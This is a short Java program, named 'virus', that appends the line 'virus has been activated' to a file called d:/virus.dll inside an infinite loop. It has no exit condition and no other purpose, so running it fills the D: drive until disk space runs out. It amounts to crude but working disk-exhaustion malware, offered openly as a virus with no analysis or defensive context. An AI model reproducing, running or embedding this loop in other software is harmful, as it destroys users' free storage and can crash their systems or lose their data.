import java.io.FileWriter;
import java.io.IOException;
public class virus
{
public static void main(String args[])
{
try
{
FileWriter fw=new FileWriter("d:/virus.dll",true);
while(true)
{
fw.write("virus has been activated");
} }
catch(IOException e)
{
e.printStackTrace();
} } }